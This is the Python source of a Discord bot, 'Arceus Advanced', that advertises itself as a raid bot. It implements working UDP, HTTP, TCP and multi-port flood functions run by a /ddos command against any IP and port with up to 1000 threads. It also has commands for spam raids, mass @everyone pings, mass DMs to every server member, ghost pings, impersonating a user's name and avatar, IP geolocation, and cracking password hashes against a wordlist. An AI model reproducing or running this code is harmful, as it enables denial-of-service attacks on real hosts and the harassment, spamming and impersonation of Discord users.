import discord
from discord.ext import commands
from discord import app_commands
import os
import threading
import aiohttp
import asyncio
import socket
import random
import requests
from flask import Flask
from colorama import init, Fore
from typing import Optional
import time
import hashlib

init(autoreset=True)

BLANK_WALL_TEXT = """_
_





















































































_
_






















































































_






















































































_
























































































_


_


_
_
























































































_
_






















































































_






















































































_
























































































_


_


_
_
























































































_
_






















































































_






















































































_
























































































_


_


_
_
























































































_
_






















































































_






















































































_
























































































_


_


_
_
























































































_
_






















































































_

"""

RAID_TEXT = """@everyone @here join now
https://discord.gg/wKZcwmTwkc
https://cdn.discordapp.com/attachments/864771769163186187/1494858322103238777/lv_0_20260407070242.gif
https://cdn.discordapp.com/attachments/864771769163186187/1494858321738465370/lv_0_20260418083206.gif"""

active_ddos_attacks = {}
attack_stats = {}

flask_app = Flask(__name__)

@flask_app.route("/")
def home():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Arceus Advanced</title>
        <style>
            body { background: #0d0d0d; color: #ff3333; font-family: monospace; text-align: center; padding: 60px; }
            h1 { font-size: 3em; text-shadow: 0 0 10px #ff0000; }
            p  { font-size: 1.2em; color: #cccccc; }
        </style>
    </head>
    <body>
        <h1>Arceus Advanced</h1>
        <p><strong>Bot is ONLINE and running 24/7</strong></p>
        <p>Discord raid bot</p>
        <p>🚀 Deployed on Railway</p>
    </body>
    </html>
    """

@flask_app.route("/health")
def health():
    return "OK", 200

def keep_alive():
    try:
        port = int(os.environ.get("PORT", 8080))
        thread = threading.Thread(
            target=lambda: flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False),
            daemon=True
        )
        thread.start()
        print(Fore.GREEN + f"[+] Flask web server started on port {port}")
    except Exception as e:
        print(Fore.RED + f"[-] Flask server error: {e}")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

def udp_flood(target_ip, target_port, stop_event, stats_key):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(0.1)
        payloads = [random._urandom(1400) for _ in range(50)]
        
        while not stop_event.is_set():
            try:
                for _ in range(10):
                    payload = random.choice(payloads)
                    sock.sendto(payload, (target_ip, target_port))
                    if stats_key in attack_stats:
                        attack_stats[stats_key] += 1
            except:
                pass
        sock.close()
    except:
        pass

def http_flood(target_ip, target_port, stop_event, stats_key):
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "*/*",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache"
        })
        target_url = f"http://{target_ip}:{target_port}"
        
        while not stop_event.is_set():
            try:
                for _ in range(5):
                    session.get(target_url, timeout=0.5)
                    if stats_key in attack_stats:
                        attack_stats[stats_key] += 1
            except:
                pass
    except:
        pass

def tcp_flood(target_ip, target_port, stop_event, stats_key):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            sock.connect((target_ip, target_port))
            sock.send(b"GET / HTTP/1.1\r\nHost: \r\n\r\n" * 100)
            sock.close()
            if stats_key in attack_stats:
                attack_stats[stats_key] += 50
        except:
            pass

def udp_multi_flood(target_ip, target_port, stop_event, stats_key):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(0.1)
        ports = [80, 443, 53, 8080, 8000, 8888, 22, 23, 21, 25, 110, 143, 993, 995, 3306, 5432, 27015, 25565]
        
        while not stop_event.is_set():
            try:
                for port in ports:
                    sock.sendto(random._urandom(1024), (target_ip, port))
                    if stats_key in attack_stats:
                        attack_stats[stats_key] += 1
            except:
                pass
        sock.close()
    except:
        pass

def start_ddos_attack(target_ip, target_port, threads=1000):
    attack_key = f"{target_ip}:{target_port}"

    if attack_key in active_ddos_attacks:
        return False

    stop_event = threading.Event()
    active_ddos_attacks[attack_key] = stop_event
    attack_stats[attack_key] = 0

    def launch():
        try:
            udp_threads = max(1, threads // 4)
            http_threads = max(1, threads // 4)
            tcp_threads = max(1, threads // 4)
            multi_threads = max(1, threads - (udp_threads + http_threads + tcp_threads))
            
            for _ in range(udp_threads):
                threading.Thread(target=udp_flood, args=(target_ip, target_port, stop_event, attack_key), daemon=True).start()
            for _ in range(http_threads):
                threading.Thread(target=http_flood, args=(target_ip, target_port, stop_event, attack_key), daemon=True).start()
            for _ in range(tcp_threads):
                threading.Thread(target=tcp_flood, args=(target_ip, target_port, stop_event, attack_key), daemon=True).start()
            for _ in range(multi_threads):
                threading.Thread(target=udp_multi_flood, args=(target_ip, target_port, stop_event, attack_key), daemon=True).start()
        except:
            pass

    threading.Thread(target=launch, daemon=True).start()
    return True

def stop_ddos_attack(target_ip, target_port):
    attack_key = f"{target_ip}:{target_port}"
    if attack_key in active_ddos_attacks:
        try:
            active_ddos_attacks[attack_key].set()
            del active_ddos_attacks[attack_key]
            if attack_key in attack_stats:
                del attack_stats[attack_key]
            return True
        except:
            return False
    return False

class DDoSView(discord.ui.View):
    def __init__(self, target_ip, target_port):
        super().__init__(timeout=300)
        self.target_ip = target_ip
        self.target_port = target_port
    
    @discord.ui.button(label="Stop DDoS", style=discord.ButtonStyle.red)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if stop_ddos_attack(self.target_ip, self.target_port):
            await interaction.response.send_message(f"Attack on `{self.target_ip}:{self.target_port}` stopped.", ephemeral=True)
        else:
            await interaction.response.send_message(f"No active attack on `{self.target_ip}:{self.target_port}`.", ephemeral=True)

    @discord.ui.button(label="Stats", style=discord.ButtonStyle.grey)
    async def stats_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        attack_key = f"{self.target_ip}:{self.target_port}"
        if attack_key in attack_stats:
            await interaction.response.send_message(f"`{self.target_ip}:{self.target_port}` - packets sent: `{attack_stats[attack_key]:,}`", ephemeral=True)
        else:
            await interaction.response.send_message("Attack not active or no stats available.", ephemeral=True)

class SpamView(discord.ui.View):
    def __init__(self, message: str):
        super().__init__(timeout=300)
        self.message = message

    @discord.ui.button(label="Send", style=discord.ButtonStyle.grey)
    async def send_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        try:
            await interaction.followup.send(self.message[:2000])
        except Exception as e:
            print(f"Send error: {e}")

    @discord.ui.button(label="Spam x5", style=discord.ButtonStyle.red)
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        try:
            for _ in range(5):
                await interaction.followup.send(self.message[:2000])
                await asyncio.sleep(0.6)
        except Exception as e:
            print(f"Spam error: {e}")

class SpamEmbedView(discord.ui.View):
    def __init__(self, embed: discord.Embed):
        super().__init__(timeout=300)
        self.embed = embed

    @discord.ui.button(label="Send", style=discord.ButtonStyle.grey)
    async def send_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        try:
            await interaction.followup.send(embed=self.embed)
        except Exception as e:
            print(f"Embed send error: {e}")

    @discord.ui.button(label="Spam x5", style=discord.ButtonStyle.red)
    async def spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        try:
            for _ in range(5):
                await interaction.followup.send(embed=self.embed)
                await asyncio.sleep(0.6)
        except Exception as e:
            print(f"Embed spam error: {e}")

class BlameView(discord.ui.View):
    def __init__(self, embed: discord.Embed):
        super().__init__(timeout=300)
        self.embed = embed

    @discord.ui.button(label="Send Message", style=discord.ButtonStyle.red)
    async def send_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        try:
            await interaction.followup.send(embed=self.embed)
        except Exception as e:
            print(f"Blame send error: {e}")

class BlankWallView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="Blank Wall x5", style=discord.ButtonStyle.grey)
    async def blank_wall_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        try:
            for _ in range(5):
                await interaction.followup.send(BLANK_WALL_TEXT[:2000])
                await asyncio.sleep(0.5)
        except Exception as e:
            print(f"Blank wall error: {e}")

class RaidView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=300)

    @discord.ui.button(label="Raid x10", style=discord.ButtonStyle.red)
    async def raid_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        try:
            for _ in range(10):
                await interaction.followup.send(RAID_TEXT[:2000])
                await asyncio.sleep(0.7)
        except Exception as e:
            print(f"Raid error: {e}")

class MassPingView(discord.ui.View):
    def __init__(self, amount: int):
        super().__init__(timeout=300)
        self.amount = amount

    @discord.ui.button(label="Mass Ping", style=discord.ButtonStyle.red)
    async def massping_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        try:
            for _ in range(self.amount):
                await interaction.followup.send("@everyone @here")
                await asyncio.sleep(0.65)
        except Exception as e:
            print(f"Mass ping error: {e}")

@bot.tree.command(name="ddos", description="Launch a DDoS attack")
@app_commands.describe(ip="Target IP", port="Port (default 80)", threads="Thread count (max 1000)")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def ddos_command(interaction: discord.Interaction, ip: str, port: int = 80, threads: int = 1000):
    await interaction.response.defer(ephemeral=True)
    
    threads = min(max(threads, 50), 1000)
    
    try:
        if start_ddos_attack(ip, port, threads):
            view = DDoSView(ip, port)
            embed = discord.Embed(
                title="DDoS Attack Started",
                description=f"Target: `{ip}:{port}`\nThreads: `{threads}`\nMethods: UDP Flood + HTTP Flood + TCP Flood + Multi-Port\nStatus: Running until stopped",
                color=discord.Color.dark_red()
            )
            embed.set_footer(text="Use /stopddos to stop the attack")
            await interaction.followup.send(embed=embed, view=view)
        else:
            await interaction.followup.send(f"Attack on `{ip}:{port}` is already running.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"Error: {str(e)[:100]}", ephemeral=True)

@bot.tree.command(name="stopddos", description="Stop a DDoS attack")
@app_commands.describe(ip="Target IP", port="Port")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def stopddos_command(interaction: discord.Interaction, ip: str, port: int = 80):
    await interaction.response.defer(ephemeral=True)
    
    if stop_ddos_attack(ip, port):
        await interaction.followup.send(f"Attack on `{ip}:{port}` stopped.", ephemeral=True)
    else:
        await interaction.followup.send(f"No active attack found on `{ip}:{port}`.", ephemeral=True)

@bot.tree.command(name="ddosstatus", description="Show active DDoS attacks and stats")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def ddosstatus_command(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    
    if active_ddos_attacks:
        attacks_list = []
        for key in list(active_ddos_attacks.keys()):
            packets = attack_stats.get(key, 0)
            attacks_list.append(f"`{key}` - `{packets:,}` packets")
            if len(attacks_list) >= 25:
                break

        embed = discord.Embed(
            title="Active DDoS Attacks",
            description="\n".join(attacks_list),
            color=discord.Color.dark_red()
        )
        embed.set_footer(text=f"Total attacks: {len(active_ddos_attacks)}")
        await interaction.followup.send(embed=embed, ephemeral=True)
    else:
        await interaction.followup.send("No active attacks.", ephemeral=True)

@bot.tree.command(name="blankwall", description="Send a blank wall")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def blankwall(interaction: discord.Interaction):
    await interaction.response.send_message("Ready.", view=BlankWallView(), ephemeral=True)

@bot.tree.command(name="raid", description="Start a raid")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def raid(interaction: discord.Interaction):
    view = RaidView()
    await interaction.response.send_message("Ready.", view=view, ephemeral=True)

@bot.tree.command(name="spamraid", description="Spam a message with buttons")
@app_commands.describe(message="Message to spam")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def spamraid(interaction: discord.Interaction, message: str):
    view = SpamView(message)
    await interaction.response.send_message(f"Preview:\n```{message[:100]}```", view=view, ephemeral=True)

@bot.tree.command(name="spamembed", description="Spam an embed with buttons")
@app_commands.describe(
    description="Main text",
    title="Title",
    color="Hex color",
    image="Image URL",
    thumbnail="Thumbnail URL",
    footer="Footer text",
    author_name="Author name"
)
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def spamembed(
    interaction: discord.Interaction,
    description: str,
    title: Optional[str] = None,
    color: Optional[str] = None,
    image: Optional[str] = None,
    thumbnail: Optional[str] = None,
    footer: Optional[str] = None,
    author_name: Optional[str] = None
):
    await interaction.response.defer(ephemeral=True)
    try:
        embed_color = discord.Color.dark_red()
        if color:
            try:
                embed_color = discord.Color(int(color.lstrip("#"), 16))
            except:
                pass

        embed = discord.Embed(description=description[:1000], color=embed_color)
        if title:
            embed.title = title[:256]
        if image:
            embed.set_image(url=image)
        if thumbnail:
            embed.set_thumbnail(url=thumbnail)
        if footer:
            embed.set_footer(text=footer[:2048])
        if author_name:
            embed.set_author(name=author_name[:256])

        view = SpamEmbedView(embed)
        await interaction.followup.send(embed=embed, view=view)
    except Exception as e:
        await interaction.followup.send(f"Error: {str(e)[:100]}", ephemeral=True)

@bot.tree.command(name="massping", description="Mass ping")
@app_commands.describe(amount="Amount (1-10)")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def massping(interaction: discord.Interaction, amount: app_commands.Range[int, 1, 10]):
    if interaction.guild is None:
        await interaction.response.send_message("This only works in a server.", ephemeral=True)
        return
    view = MassPingView(amount)
    await interaction.response.send_message(f"Ready x{amount}", view=view, ephemeral=True)

@bot.tree.command(name="massdm", description="DM all members")
@app_commands.describe(message="Message")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def massdm(interaction: discord.Interaction, message: str):
    if interaction.guild is None:
        await interaction.response.send_message("This only works in a server.", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    sent = 0
    failed = 0
    try:
        for member in interaction.guild.members:
            if not member.bot:
                try:
                    await member.send(message[:2000])
                    sent += 1
                except:
                    failed += 1
                await asyncio.sleep(0.8)
        await interaction.followup.send(f"Sent: {sent} | Failed: {failed}", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"Error: {str(e)[:100]}", ephemeral=True)

@bot.tree.command(name="ghostping", description="Ghost ping a user")
@app_commands.describe(user="User")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def ghostping(interaction: discord.Interaction, user: discord.Member):
    if interaction.guild is None:
        await interaction.response.send_message("This only works in a server.", ephemeral=True)
        return
    try:
        await interaction.response.send_message(f"<@{user.id}>")
        await interaction.delete_original_response()
    except Exception as e:
        print(f"Ghostping error: {e}")

@bot.tree.command(name="blame", description="Blame a user")
@app_commands.describe(user="User", message="Reason")
@app_commands.guild_only()
async def blame(interaction: discord.Interaction, user: discord.Member, message: str):
    embed = discord.Embed(description=message[:500], color=discord.Color(0x000000))
    embed.set_author(name=user.display_name, icon_url=user.display_avatar.url)
    view = BlameView(embed)
    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)

@bot.tree.command(name="info", description="List all commands")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def info(interaction: discord.Interaction):
    embed = discord.Embed(title="Arceus Advanced", color=discord.Color.dark_red())
    embed.add_field(name="/ddos", value="Launch a DDoS attack (1000 threads, runs until stopped)", inline=False)
    embed.add_field(name="/stopddos", value="Stop a DDoS attack", inline=False)
    embed.add_field(name="/ddosstatus", value="Show active attacks and packet stats", inline=False)
    embed.add_field(name="/blankwall", value="Send a blank wall x5", inline=False)
    embed.add_field(name="/raid", value="Raid x10", inline=False)
    embed.add_field(name="/spamraid", value="Spam a message with buttons", inline=False)
    embed.add_field(name="/spamembed", value="Spam an embed with buttons", inline=False)
    embed.add_field(name="/massping", value="Mass ping (server only)", inline=False)
    embed.add_field(name="/massdm", value="DM all members (server only)", inline=False)
    embed.add_field(name="/ghostping", value="Ghost ping a user (server only)", inline=False)
    embed.add_field(name="/blame", value="Blame a user (server only)", inline=False)
    embed.add_field(name="/iplookup", value="IP lookup with VPN detection", inline=False)
    embed.add_field(name="/hashcat", value="Crack a hash (dictionary + numbers 0-99)", inline=False)
    embed.set_footer(text="Arceus Advanced | Deployed on Railway")
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="iplookup", description="IP lookup with VPN detection")
@app_commands.describe(ip="IP address")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def iplookup(interaction: discord.Interaction, ip: str):
    await interaction.response.defer(ephemeral=True)
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,isp,proxy,hosting,mobile,query,lat,lon"
        async with aiohttp.ClientSession() as session:
            async with session.get(url, timeout=10) as resp:
                data = await resp.json()

        if data.get("status") == "fail":
            await interaction.followup.send("Invalid IP.", ephemeral=True)
            return

        embed = discord.Embed(title=f"IP: {data.get('query')}", color=discord.Color.dark_red())
        embed.add_field(name="Country", value=data.get('country', 'N/A'), inline=True)
        embed.add_field(name="Region", value=data.get('regionName', 'N/A'), inline=True)
        embed.add_field(name="City", value=data.get('city', 'N/A'), inline=True)
        embed.add_field(name="ISP", value=data.get('isp', 'N/A'), inline=False)
        embed.add_field(name="VPN/Proxy", value="Yes" if data.get('proxy') else "No", inline=True)
        embed.add_field(name="Hosting", value="Yes" if data.get('hosting') else "No", inline=True)
        embed.add_field(name="Mobile", value="Yes" if data.get('mobile') else "No", inline=True)
        if data.get('lat') and data.get('lon'):
            embed.add_field(name="Coordinates", value=f"{data.get('lat')}, {data.get('lon')}", inline=True)
        await interaction.followup.send(embed=embed, ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"Error: {str(e)[:100]}", ephemeral=True)

DICTIONARY = [
    "password", "123456", "123456789", "qwerty", "abc123", "monkey", "dragon", "master",
    "hello", "letmein", "welcome", "admin", "root", "user", "guest", "login", "pass",
    "secret", "changeme", "default", "iloveyou", "princess", "sunshine", "shadow",
    "superman", "batman", "hunter", "ranger", "soccer", "hockey", "baseball", "football",
    "nascar", "harley", "mustang", "porsche", "ferrari", "mercedes", "bmw", "audi",
    "google", "yahoo", "hotmail", "gmail", "outlook", "microsoft", "apple", "samsung",
    "pokemon", "naruto", "sonic", "mario", "zelda", "starwars", "matrix", "cyber",
    "ghost", "sniper", "killer", "warrior", "knight", "wizard", "phoenix", "tiger",
    "wolf", "eagle", "shark", "lion", "bear", "raven", "sparrow", "cookie", "chocolate",
    "summer", "winter", "spring", "autumn", "morning", "night", "midnight", "sunset",
    "freedom", "justice", "peace", "love", "hope", "faith", "destiny", "dream", "angel",
    "devil", "demon", "ghost", "phantom", "shadow", "darkness", "light", "fire", "water",
    "earth", "wind", "storm", "thunder", "lightning", "rainbow", "flower", "butterfly"
]

def hash_word(word, hash_type):
    try:
        encoded = word.encode("utf-8")
        if hash_type == "md5":
            return hashlib.md5(encoded).hexdigest()
        elif hash_type == "sha1":
            return hashlib.sha1(encoded).hexdigest()
        elif hash_type == "sha256":
            return hashlib.sha256(encoded).hexdigest()
        elif hash_type == "sha512":
            return hashlib.sha512(encoded).hexdigest()
        elif hash_type == "ntlm":
            return hashlib.new("md4", word.encode("utf-16le")).hexdigest()
    except:
        return None
    return None

def detect_hash(hash_string):
    hash_string = hash_string.strip().lower()
    if len(hash_string) == 32:
        return ["md5", "ntlm"]
    elif len(hash_string) == 40:
        return ["sha1"]
    elif len(hash_string) == 64:
        return ["sha256"]
    elif len(hash_string) == 128:
        return ["sha512"]
    else:
        return ["unknown"]

@bot.tree.command(name="hashcat", description="Crack a hash using dictionary + numbers 0-99")
@app_commands.describe(hash="Hash to crack (MD5, SHA1, SHA256, SHA512, NTLM)")
@app_commands.allowed_installs(guilds=True, users=True)
@app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
async def hashcat_command(interaction: discord.Interaction, hash: str):
    await interaction.response.defer(ephemeral=True)
    
    try:
        target_hash = hash.strip()
        hash_types = detect_hash(target_hash)
        
        if hash_types[0] == "unknown":
            await interaction.followup.send(f"Unknown hash format. Length: {len(target_hash)}. Supported: 32 (MD5/NTLM), 40 (SHA1), 64 (SHA256), 128 (SHA512)", ephemeral=True)
            return
        
        found = None
        found_type = None
        attempts = 0
        
        for word in DICTIONARY:
            for ht in hash_types:
                attempts += 1
                if hash_word(word, ht) == target_hash:
                    found = word
                    found_type = ht.upper()
                    break
                
                for num in range(100):
                    attempts += 1
                    test_word = f"{word}{num}"
                    if hash_word(test_word, ht) == target_hash:
                        found = test_word
                        found_type = ht.upper()
                        break
                    
                    test_word2 = f"{num}{word}"
                    if hash_word(test_word2, ht) == target_hash:
                        found = test_word2
                        found_type = ht.upper()
                        break
                    
                    if found:
                        break
            if found:
                break
        
        embed = discord.Embed(color=discord.Color.dark_red())
        embed.add_field(name="Hash", value=f"`{target_hash[:80]}`", inline=False)
        embed.add_field(name="Detected Type", value=" / ".join([t.upper() for t in hash_types]), inline=True)
        embed.add_field(name="Attempts", value=f"{attempts:,}", inline=True)
        
        if found:
            embed.title = "Cracked"
            embed.add_field(name="Plaintext", value=f"`{found}`", inline=False)
            embed.add_field(name="Algorithm", value=found_type, inline=True)
        else:
            embed.title = "Not Found"
            embed.add_field(name="Result", value="Hash not found in dictionary (words + numbers 0-99).", inline=False)
        
        await interaction.followup.send(embed=embed, ephemeral=True)
        
    except Exception as e:
        await interaction.followup.send(f"Error: {str(e)[:100]}", ephemeral=True)

@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error: app_commands.AppCommandError):
    try:
        msg = f"Error: {str(error)[:200]}"
        if interaction.response.is_done():
            await interaction.followup.send(msg, ephemeral=True)
        else:
            await interaction.response.send_message(msg, ephemeral=True)
    except Exception:
        pass
    print(Fore.RED + f"Command error: {error}")

@bot.event
async def on_ready():
    print(Fore.RED + "\n=================================")
    print(Fore.RED + "     ARCEUS ADVANCED BOT")
    print(Fore.RED + "=================================")
    print(Fore.GREEN + f"\nStatus: Online")
    print(Fore.YELLOW + f"Bot: {bot.user}")
    print(Fore.CYAN + f"ID: {bot.user.id}")
    
    try:
        await bot.tree.sync()
        print(Fore.GREEN + "[+] Commands synced globally")
    except Exception as e:
        print(Fore.RED + f"[-] Sync error: {e}")
    
    await bot.change_presence(
        status=discord.Status.online,
        activity=discord.Activity(type=discord.ActivityType.watching, name="/info | Arceus")
    )
    
    print(Fore.MAGENTA + "\nReady.")
    print(Fore.YELLOW + "Bot running forever.")

@bot.event
async def on_error(event, *args, **kwargs):
    print(Fore.RED + f"Error in {event}: {args}")

async def run_bot():
    while True:
        try:
            async with bot:
                await bot.start(os.environ.get("DISCORD_TOKEN"))
        except discord.errors.LoginFailure:
            print(Fore.RED + "[-] Invalid token! Retrying in 30 seconds...")
            await asyncio.sleep(30)
        except Exception as e:
            print(Fore.RED + f"[-] Bot crashed: {e}")
            print(Fore.YELLOW + "[!] Restarting in 5 seconds...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    keep_alive()
    
    TOKEN = os.environ.get("DISCORD_TOKEN")
    if not TOKEN:
        print(Fore.RED + "[-] DISCORD_TOKEN not found in secrets!")
        exit(1)
    
    while True:
        try:
            asyncio.run(run_bot())
        except Exception as e:
            print(Fore.RED + f"[-] Fatal crash: {e}")
            print(Fore.YELLOW + "[!] Hard restart in 5 seconds...")
            time.sleep(5)
